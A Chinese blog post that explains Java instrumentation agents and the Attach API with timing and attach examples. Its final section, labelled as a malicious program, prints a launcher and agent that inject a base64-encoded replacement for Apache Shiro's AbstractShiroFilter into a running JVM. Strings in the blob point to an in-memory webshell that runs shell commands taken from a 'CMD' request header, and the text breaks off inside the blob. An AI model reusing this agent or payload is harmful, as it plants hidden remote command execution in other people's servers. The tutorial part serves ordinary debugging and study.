---
title: "Java 程序探测或追踪"
date: 2019-10-30T15:27:01+08:00
draft: false
description: ""
tags: [java, trace]
categories: []
---

JDK 5 引入了 Instrument，JDK 6 引入了 Attach API。

<!--more-->

## 序言

什么情况下应该探测或追踪程序？应用程序无不例外可能存在运行时才暴露的 bug，生产环境的故障排除，不得不依靠读日志和 Review 代码，运气好的话也许只看异常栈和关键代码就能快速提出假设，在本地验证通过，修复后发布上线，最后还可能对先前测试不充分感到羞愧。很不幸，如果是底层或性能的疑难杂症，CPU、内存、I/O、进程、线程、堆、栈等都可能提供线索，它们在程序运行过程中动态变化，只有探测或追踪它们才能超越表面的代码观察，从而搜集下层行为数据以供分析，参与 debug 的程序员则如虎添翼。在 Java 平台，[BTrace](https://github.com/btraceio/btrace) 非常适合动态追踪正在运行的程序，它的基础正是 Java Instrumention 和 Java Attach API。

## Instrument

### 简介

Oracle JDK 里有一个名为 `java.lang.instrument` 的包：

> Provides services that allow Java programming language agents to instrument programs running on the JVM. The mechanism for instrumentation is modification of the byte-codes of methods. [0]

从它的简介，我们可以确认的是 instrumentation 的机制是修改 Java 字节码，而且我们已经知道类文件包含字节码。不过等等，instrumentation 和 instrument 都是什么意思？在这里的 instrument，我暂时还找不到恰到好处的汉译，作动词时意为“给......装测量仪器”或者“仪器化”，结合简介，此包允许 Java agent 给运行在 JVM 上的程序装测量仪器。Java agent 又是什么？它可以作为 Java 程序的探针，它本质上是一个 Jar 文件，它利用 Instrumentation 来更改已加载到 JVM 的类，例如往原类插入用于探测或追踪的代码，即所谓的埋点，它的底层实现依赖于 [JVMTI (Java Virtual Machine Tool Interface)](https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html)。

> In the context of computer programming, instrumentation refers to an ability to monitor or measure the level of a product's performance, to diagnose errors, and to write trace information. [1]

上面这一段是 instrumentation 在维基百科的定义，instrumentation 是一种监控或测量应用程序性能，诊断错误以及写入跟踪信息的能力，此包当中的 `java.lang.instrument.Instrumentation` 接口，亦是如此：

> This class provides services needed to instrument Java programming language code. Instrumentation is the addition of byte-codes to methods for the purpose of gathering data to be utilized by tools. Since the changes are purely additive, these tools do not modify application state or behavior. Examples of such benign tools include monitoring agents, profilers, coverage analyzers, and event loggers. [2]

它被监控代理，分析器，覆盖率分析仪，事件记录器等工具所使用，诸如 [jvisualvm](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jvisualvm.html)、[JProfiler](https://www.ej-technologies.com/products/jprofiler/overview.html)、[Arthas](https://github.com/alibaba/arthas) 等，这些工具通常不会改变目标程序的状态或行为。

### 体验

如何以**非侵入式**测量 Java 方法执行耗时？你可能立马想到了操作字节码的库或框架，比如 [JDK 动态代理](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html)、[cglib](https://github.com/cglib/cglib)、[ASM](https://asm.ow2.io)、[javassist](https://github.com/jboss-javassist/javassist)、[byte-buddy](https://github.com/raphw/byte-buddy)......通过操作字节码在方法或代码块执行前后插入计时代码，但却极有可能需要手动更改原来的程序代码，例如添加依赖项以及新增切面类等等，既然如此，那就请 Java agent 帮忙吧。

假设有一个 Cat 类，它有一些耗时方法，如下：

```java
public class Cat {

    public static void run() throws InterruptedException {
        System.out.println("Cat is running");
        Thread.sleep(RandomUtils.nextLong(3, 7));
    }
}
```

现在要利用 Java agent 测量 run 方法的执行时间，则需先构建 Java agent，因为它是 Jar 文件，要对被探测或追踪的程序起作用必然要先加载到 JVM，有两种方式，一是在 JVM 启动时通过命令行接口开启 agent；二是 JVM 启动后通过 Java Attach API 把 agent 附加到 JVM。

首先以第一种方式来考虑 agent 类：

```java
public class ElapsedTimeAgent {

    public static void premain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new ElapsedTimeTransformer(agentArgs));
    }
}
```

此类实现了一个 `premain` 方法，它与我们常见的 `main` 方法相似，不仅都是作为执行的入口点，而且第一个方法参数的值来源于命令行，不过参数类型是字符串而不是字符串数组，命令行参数的解析交由用户实现；第二个参数类型是 `Instrumentation`，有两种获得其实例的方式：

1. 当以指定了 Java agent 的方式启动 JVM，Instrumentation 实例将传递给 agent 类的 `premain` 方法。

2. 当 Java agent 附加到启动后的 JVM，Instrumentation 实例将传递到 agent 类的 `agentmain` 方法。

这两种方式与加载 Java agent 的方式一一对应。`Instrumentation` 的 `addTransformer` 方法用于注册已提供的 transformer：

```java
public class ElapsedTimeTransformer implements ClassFileTransformer {
    private String agentArgs;

    public ElapsedTimeTransformer() {
    }

    public ElapsedTimeTransformer(String agentArgs) {
        this.agentArgs = agentArgs;
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        byte[] bytecode = classfileBuffer;
        if (className.equals(agentArgs)) {
            ClassPool classPool = ClassPool.getDefault();
            try {
                CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));
                CtMethod[] methods = ctClass.getDeclaredMethods();
                for (CtMethod method : methods) {
                    method.addLocalVariable("begin", CtClass.longType);
                    method.addLocalVariable("end", CtClass.longType);

                    method.insertBefore("begin = System.nanoTime();");
                    method.insertAfter("end = System.nanoTime();");
                    String methodName = method.getLongName();
                    String x = "System.out.println(\"" + methodName + "\" + \": \" + (end - begin) + \" ns\"" + ");";
                    method.insertAfter(x);
                }
                bytecode = ctClass.toBytecode();
                ctClass.detach();
            } catch (IOException | CannotCompileException e) {
                e.printStackTrace();
            }
        }
        return bytecode;
    }
}
```

重写 `transform` 方法允许我们用修改后的类代替原类并加载。具体实现是使用 javassist 的 API 去更改已加载类的字节码，在类方法体的开头和结尾分别插入获取当前的纳秒级时间戳语句，并在最后插入计算结果的打印语句，新类的字节码作为 `transform` 方法的返回值。`transform` 方法什么时候被调用？每一个新类被类加载器加载时。

其次，新建 MANIFEST.MF 文件编写一些键值对告诉 JVM 这个 agent 类在哪里以及是否允许重定义类或重转换类：

```
Manifest-Version: 1.0
Premain-Class: io.h2cone.trace.agent.ElapsedTimeAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

再次，利用 Maven 插件构建 agent jar 文件：

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-assembly-plugin</artifactId>
    <version>3.1.1</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals>
                <goal>single</goal>
            </goals>
            <configuration>
                <finalName>agent</finalName>
                <archive>
                    <manifestFile>src/main/resources/META-INF/MANIFEST.MF</manifestFile>
                </archive>
                <descriptorRefs>
                    <descriptorRef>jar-with-dependencies</descriptorRef>
                </descriptorRefs>
            </configuration>
        </execution>
    </executions>
</plugin>
```

然后，给 Cat 类编写测试用的主类：

```java
public class CatMain {

    public static void main(String[] args) throws InterruptedException {
        Cat.run();
    }
}
```

并把两者构建成可执行且名为 app 的 jar 文件：

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-shade-plugin</artifactId>
    <version>3.2.1</version>
    <executions>
        <execution>
            <goals>
                <goal>shade</goal>
            </goals>
            <configuration>
                <finalName>app</finalName>
                <shadedArtifactAttached>true</shadedArtifactAttached>
                <transformers>
                    <transformer implementation=
                                            "org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
                        <mainClass>io.h2cone.inst.app.CatMain</mainClass>
                    </transformer>
                </transformers>
            </configuration>
        </execution>
    </executions>
</plugin>
```

最后，得到了 agent-jar-with-dependencies.jar 和 app.jar 后，查阅 Java agent 命令行接口文档：

```shell
-javaagent:jarpath[=options]
```

`jarpath` 是 agent jar 文件的路径，可选的 `options` 能传递给 agent 类的 `premain` 方法，这里传递 Cat 类的命名：io/h2cone/inst/app/Cat，表示我们要测量它的方法执行时间：

```shell
java -javaagent:agent-jar-with-dependencies.jar=io/h2cone/inst/app/Cat -jar app.jar
```

结果表明，不仅 Cat 类的 run 方法正常执行，而且输出了该方法的执行时间：

```
Cat is running
io.h2cone.inst.app.Cat.run(): 73993800 ns
```

完整代码已发布，请参考 [inst-agent](https://github.com/h2cone/java-examples/tree/master/inst-agent) 和 [inst-app](https://github.com/h2cone/java-examples/tree/master/inst-app)。

## Attach

### 简述

翻阅 Oracle JDK 文档可以找到名为 `com.sun.tools.attach` 的包：

> Provides the API to attach to a Java virtual machine. [3]

在上一节，列出了加载 Java agent 的两种方式，第二种方式使用 Attach API，把 Java agent 附加到启动后的 JVM，采用这种方式**无需重启 JVM**。Attach 是如何实现的呢？初步大胆猜想，利用 Attach API 编写而成的程序与目标 JVM 进行了线程间通信，传输 Java agent 并装载到目标 JVM。

> 跟踪程序通过 Unix Domain Socket 与目标 JVM 的 Attach Listener 线程进行交互。[4]

### 例子

编写一只可以持续汪汪叫的小狗：

```java
public class DogMain {

    public static void main(String[] args) throws InterruptedException {
        String name = ManagementFactory.getRuntimeMXBean().getName();
        System.out.printf("managed bean name: %s\n", name);
        while (true) {
            Thread.sleep(10000);
            CompletableFuture.runAsync(() -> System.out.println("Woof Woof"));
        }
    }
}
```

这个程序跑起来后 20 秒内输出：

```
managed bean name: 5424@borvino
Woof Woof
```

注意 managed bean name 的值为 5424@borvino，当中的 5424 就是这个进程的 PID。

方便起见，编写简易的 agent 类：

```java
public class OwnerAgent {

    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception {
        System.out.println("agentmain agentArgs: " + agentArgs);
        System.out.println("agentmain inst: " + inst);
    }

    public static void premain(String agentArgs, Instrumentation inst) throws Exception {
        System.out.println("premain agentArgs: " + agentArgs);
        System.out.println("premain inst: " + inst);
    }
}
```

回想前文所说的获取 `Instrumentation` 实例的两种方式，当把 Java agent 附加到 JVM 时，`Instrumentation` 实例将传递到 agent 类的 `agentmain` 方法，也是就说 `agentmain` 将会被调用。

不忘编写 MANIFEST.MF 文件：

```
Manifest-Version: 1.0
Premain-Class: io.h2cone.attach.agent.OwnerAgent
Agent-Class: io.h2cone.attach.agent.OwnerAgent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

既声明 `Agent-Class` 也声明 `Premain-Class`，OwnerAgent 类同时满足两种方式所要求的方法签名。

与上文相似，打包好 agent.jar 后，方便起见，直接用 IDE 启动 DogMain，从控制台读取目标 JVM 的 PID，万事俱备，首先依附到 JVM，然后动态加载 agent 到 JVM，最后分离：

```java
@Test
public void attach() throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
    String pid = "pid";                             // 目标 JVM 的 PID
    VirtualMachine vm = VirtualMachine.attach(pid);

    String agentJarPath = "path to agent.jar";      // agent.jar 文件的路径
    String options = "Hello, Dog";
    vm.loadAgent(agentJarPath, options);
    vm.detach();
}
```

试验结果：

```
managed bean name: 5424@borvino
Woof Woof
agentmain agentArgs: Hello, Dog
agentmain inst: sun.instrument.InstrumentationImpl@4c4744d8
Woof Woof
Woof Woof
```

OwnerAgent 类的 `agentmain` 方法被调用，DogMain 的 `main` 方法也正常执行。

完整代码已发布，请参考 [attach-agent](https://github.com/h2cone/java-examples/tree/master/attach-agent) 和 [attach-app](https://github.com/h2cone/java-examples/tree/master/attach-app)。

## 恶意程序

Test.class：

```java
public class Test {
  public static void main(String[] paramArrayOfString) throws AgentLoadException, AgentInitializationException, IOException, AttachNotSupportedException {
    attach(paramArrayOfString[0]);
  }
  
  public static void attach(String paramString) throws AgentLoadException, AgentInitializationException, IOException, AttachNotSupportedException {
    String str1 = paramString;
    String str2 = (new File("agent.jar")).getAbsolutePath();
    System.out.println("attaching....pid=" + str1);
    VirtualMachine virtualMachine = VirtualMachine.attach(str1);
    virtualMachine.loadAgent(str2, null);
    virtualMachine.detach();
  }
}
```

agent.jar/HotSwapAgent.class：

```java
public class HotSwapAgent {
  public static void premain(String paramString, Instrumentation paramInstrumentation) {}
  
  public static void agentmain(String paramString, Instrumentation paramInstrumentation) {
    try {
      Class[] arrayOfClass = paramInstrumentation.getAllLoadedClasses();
      for (Class<?> clazz : arrayOfClass) {
        if (clazz.getName().equals("org.apache.shiro.web.servlet.AbstractShiroFilter")) {
          System.out.println(clazz.getName());
          byte[] arrayOfByte = (new BASE64Decoder()).decodeBuffer("yv66vgAAADIBbQoAYgCvCQBgALAJAGAAsQkAYACyCgBgALMKAGAAtAoAYAC1CgBgALYKAGAAtwoAuAC5CABuCgBgALoKALsAvAoAuwC9CgBgAL4JAGAAvwgAwAsAwQDCCgBgAMMKAGAAxAcAxQoAFQCvCwDGAMcHAMgKAGAAyQoAYADKCgAYAMsHAMwKAGAAzQcAzgoAHgDPBwDQCgBgANEHANMKACIA1QoAIgDWCgC4ANcLANgA2QsA2gDbBwDcCADdCwDBAN4JAN8A4AoA4QDiCADjCwAcAOQIAOUKAN8A5goANADnCADoCgA0AOkHAOoIAOsIAOwIAO0IAO4HAO8KADkA8AoAOQDxCgA5APIKAPMA9AcA9QoAPgCvCgD2APcKAD4A+AoAPgD5BwD6CwAgAPsKAEMA/AoAPgD9CgA0AP4KAEMA/woAQwD5CgBDAQAKAGABAQoAYAECCgBgAQMHAQQKAE4BBQsA2AEGBwEHCgBRAQgHAQkHAQoIAQsKAFMBDAoAYAENCAEOCwDBAQ8LARABEQgBEgsAwQETCAEUCgBgARULARYBFwcBGAoBGQEaBwEbAQAAAQAMSW5uZXJDbGFzc2VzAQADbG9nAQASTG9yZy9zbGY0ai9Mb2dnZXI7AQAWU1RBVElDX0lOSVRfUEFSQU1fTkFNRQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAA9zZWN1cml0eU1hbmFnZXIBAC1Mb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjsBABNmaWx0ZXJDaGFpblJlc29sdmVyAQA1TG9yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcjsBABxzdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJnZXRTZWN1cml0eU1hbmFnZXIBAC8oKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9tZ3QvV2ViU2VjdXJpdHlNYW5hZ2VyOwEAEnNldFNlY3VyaXR5TWFuYWdlcgEAMChMb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjspVgEAFmdldEZpbHRlckNoYWluUmVzb2x2ZXIBADcoKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9maWx0ZXIvbWd0L0ZpbHRlckNoYWluUmVzb2x2ZXI7AQAWc2V0RmlsdGVyQ2hhaW5SZXNvbHZlcgEAOChMb3JnL2FwYWNoZS9zaGlyby93ZWIvZmlsdGVyL21ndC9GaWx0ZXJDaGFpblJlc29sdmVyOylWAQAeaXNTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQADKClaAQAfc2V0U3RhdGljU2VjdXJpdHlNYW5hZ2VyRW5hYmxlZAEABChaKVYBABFvbkZpbHRlckNvbmZpZ1NldAEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zBwEcAQAnYXBwbHlTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkQ29uZmlnBwDqAQAEaW5pdAEAFWVuc3VyZVNlY3VyaXR5TWFuYWdlcgcBHQEAHGNyZWF0ZURlZmF1bHRTZWN1cml0eU1hbmFnZXIBAA5pc0h0dHBTZXNzaW9ucwEAEndyYXBTZXJ2bGV0UmVxdWVzdAEARyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAVcHJlcGFyZVNlcnZsZXRSZXF1ZXN0AQB4KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7BwEeAQATd3JhcFNlcnZsZXRSZXNwb25zZQEAfyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvU2hpcm9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABZwcmVwYXJlU2VydmxldFJlc3BvbnNlAQB5KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwcBHwEADWNyZWF0ZVN1YmplY3QBAGgoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEAG3VwZGF0ZVNlc3Npb25MYXN0QWNjZXNzVGltZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHARgHASAHASEHANwBABBkb0ZpbHRlckludGVybmFsAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgcBIgcAzAcA0AcBIwcA7wcBJAcA9QcBJQcBBwEAEWdldEV4ZWN1dGlvbkNoYWluAQB1KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEmAQAMZXhlY3V0ZUNoYWluAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAYQWJzdHJhY3RTaGlyb0ZpbHRlci5qYXZhDABwAHEMAG4AbwwAagBrDABsAG0MAIQAcQwAhgBxDACHAHEMAHwAfQwAdAB1BwEnDAB2ASgMASkBKgcBKwwBLAEtDAEuAH0MAH4AfwwAZQBmAQAxTm8gU2VjdXJpdHlNYW5hZ2VyIGNvbmZpZ3VyZWQuICBDcmVhdGluZyBkZWZhdWx0LgcBLwwBMAExDACJAHUMAHYAdwEAMm9yZy9hcGFjaGUvc2hpcm8vd2ViL21ndC9EZWZhdWx0V2ViU2VjdXJpdHlNYW5hZ2VyBwEdDAEyAH0BADRvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEzATQMAIoAfQwAcAE1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAiwCMAQA1b3JnL2FwYWNoZS9zaGlyby93ZWIvc2VydmxldC9TaGlyb0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHABNgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDACQAJEHATcBAC9vcmcvYXBhY2hlL3NoaXJvL3dlYi9zdWJqZWN0L1dlYlN1YmplY3QkQnVpbGRlcgEAB0J1aWxkZXIMAHABOAwBOQE6DAE7ATwHASAMAT0BPgcBIQwBPwBxAQATamF2YS9sYW5nL1Rocm93YWJsZQEAinNlc3Npb24udG91Y2goKSBtZXRob2QgaW52b2NhdGlvbiBoYXMgZmFpbGVkLiAgVW5hYmxlIHRvIHVwZGF0ZXRoZSBjb3JyZXNwb25kaW5nIHNlc3Npb24ncyBsYXN0IGFjY2VzcyB0aW1lIGJhc2VkIG9uIHRoZSBpbmNvbWluZyByZXF1ZXN0LgwBQAFBBwFCDAFDAUQHAUUMAUYAfwEAA0NNRAwBRwEqAQAHb3MubmFtZQwBSAEqDAFJAUoBAAd3aW5kb3dzDAFLAUwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEABy9iaW4vc2gBAAIvYwEAAi1jAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABwAU0MAU4BTwwBUAFRBwFSDAFTAVQBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBJAwBVQFWDAFXAVgMAVkAcQEAE2phdmEvaW8vUHJpbnRXcml0ZXIMAVoBWwwAcAFcDAFdAV4MAHABXwwBVwExDAFgAHEMAI0AjgwAkgCTDACVAJYBADJvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIkMQwAcAFhDAFiAWMBACtvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvRXhlY3V0aW9uRXhjZXB0aW9uDAFkAWUBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAYRmlsdGVyZWQgcmVxdWVzdCBmYWlsZWQuDABwAUEMAHgAeQEAQ05vIEZpbHRlckNoYWluUmVzb2x2ZXIgY29uZmlndXJlZC4gIFJldHVybmluZyBvcmlnaW5hbCBGaWx0ZXJDaGFpbi4MAWYBMQcBJgwBZwCpAQA6UmVzb2x2ZWQgYSBjb25maWd1cmVkIEZpbHRlckNoYWluIGZvciB0aGUgY3VycmVudCByZXF1ZXN0LgwBaAExAQBGTm8gRmlsdGVyQ2hhaW4gY29uZmlndXJlZCBmb3IgdGhlIGN1cnJlbnQgcmVxdWVzdC4gIFVzaW5nIHRoZSBkZWZhdWx0LgwAqACpBwEiDAFpAJgBADBvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L0Fic3RyYWN0U2hpcm9GaWx0ZXIHAWoMAWsBbAEAMW9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvT25jZVBlclJlcXVlc3RGaWx0ZXIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAIG9yZy9hcGFjaGUvc2hpcm8vc3ViamVjdC9TdWJqZWN0AQAgb3JnL2FwYWNoZS9zaGlyby9zZXNzaW9uL1Nlc3Npb24BABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAJbQgEAM29yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcgEAHm9yZy9hcGFjaGUvc2hpcm8vU2VjdXJpdHlVdGlscwEAKShMb3JnL2FwYWNoZS9zaGlyby9tZ3QvU2VjdXJpdHlNYW5hZ2VyOylWAQAMZ2V0SW5pdFBhcmFtAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQm9vbGVhbjsBAAxib29sZWFuVmFsdWUBABBvcmcvc2xmNGovTG9nZ2VyAQAEaW5mbwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWlzSHR0cFNlc3Npb25Nb2RlAQARZ2V0U2VydmxldENvbnRleHQBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEASShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDtaKVYBAH8oTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0O0xvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0OylWAQAnb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0AQBmKExvcmcvYXBhY2hlL3NoaXJvL21ndC9TZWN1cml0eU1hbmFnZXI7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPYnVpbGRXZWJTdWJqZWN0AQArKClMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEACmdldFN1YmplY3QBACQoKUxvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvU3ViamVjdDsBAApnZXRTZXNzaW9uAQAlKFopTG9yZy9hcGFjaGUvc2hpcm8vc2Vzc2lvbi9TZXNzaW9uOwEABXRvdWNoAQAFZXJyb3IBACooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAlnZXRIZWFkZXIBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFZmx1c2gBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAFY2xvc2UBAI0oTG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvQWJzdHJhY3RTaGlyb0ZpbHRlcjtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdleGVjdXRlAQAzKExqYXZhL3V0aWwvY29uY3VycmVudC9DYWxsYWJsZTspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2F1c2UBABcoKUxqYXZhL2xhbmcvVGhyb3dhYmxlOwEABWRlYnVnAQAIZ2V0Q2hhaW4BAAV0cmFjZQEACGRvRmlsdGVyAQAXb3JnL3NsZjRqL0xvZ2dlckZhY3RvcnkBAAlnZXRMb2dnZXIBACUoTGphdmEvbGFuZy9DbGFzczspTG9yZy9zbGY0ai9Mb2dnZXI7BCEAYABiAAAABQAaAGUAZgAAABoAZwBoAAEAaQAAAAIACwACAGoAawAAAAIAbABtAAAAAgBuAG8AAAAXAAQAcABxAAEAcgAAACoAAgABAAAACiq3AAEqA7UAArEAAAABAHMAAAAOAAMAAABdAAQAXgAJAF8AAQB0AHUAAQByAAAAHQABAAEAAAAFKrQAA7AAAAABAHMAAAAGAAEAAABiAAEAdgB3AAEAcgAAACIAAgACAAAABiortQADsQAAAAEAcwAAAAoAAgAAAGYABQBnAAEAeAB5AAEAcgAAAB0AAQABAAAABSq0AASwAAAAAQBzAAAABgABAAAAagABAHoAewABAHIAAAAiAAIAAgAAAAYqK7UABLEAAAABAHMAAAAKAAIAAABuAAUAbwABAHwAfQABAHIAAAAdAAEAAQAAAAUqtAACrAAAAAEAcwAAAAYAAQAAAIIAAQB+AH8AAQByAAAAIgACAAIAAAAGKhu1AAKxAAAAAQBzAAAACgACAAAAkgAFAJMAFACAAHEAAgByAAAAUAABAAEAAAAbKrcABSq2AAYqtwAHKrYACJkACiq2AAm4AAqxAAAAAgBzAAAAGgAGAAAAlwAEAJgACACZAAwAmwATAJwAGgCeAIEAAAADAAEaAIIAAAAEAAEAgwACAIQAcQABAHIAAABXAAIAAwAAAB0qEgu2AAxMK8YAFCu4AA1NLMYACyostgAOtgAPsQAAAAIAcwAAABoABgAAAKgABwCpAAsAqgAQAKsAFACsABwArwCBAAAACAAB/AAcBwCFAAEAhgBxAAIAcgAAABkAAAABAAAAAbEAAAABAHMAAAAGAAEAAACyAIIAAAAEAAEAgwACAIcAcQABAHIAAABYAAIAAgAAAB4qtgAJTCvHABeyABASEbkAEgIAKrYAE0wqK7YAFLEAAAACAHMAAAAaAAYAAAC6AAUAuwAJALwAEwC9ABgAvgAdAMAAgQAAAAgAAfwAHQcAiAAEAIkAdQABAHIAAAAgAAIAAQAAAAi7ABVZtwAWsAAAAAEAcwAAAAYAAQAAAMMABACKAH0AAQByAAAAIgABAAEAAAAKKrYACbkAFwEArAAAAAEAcwAAAAYAAQAAAMcABACLAIwAAQByAAAAKQAFAA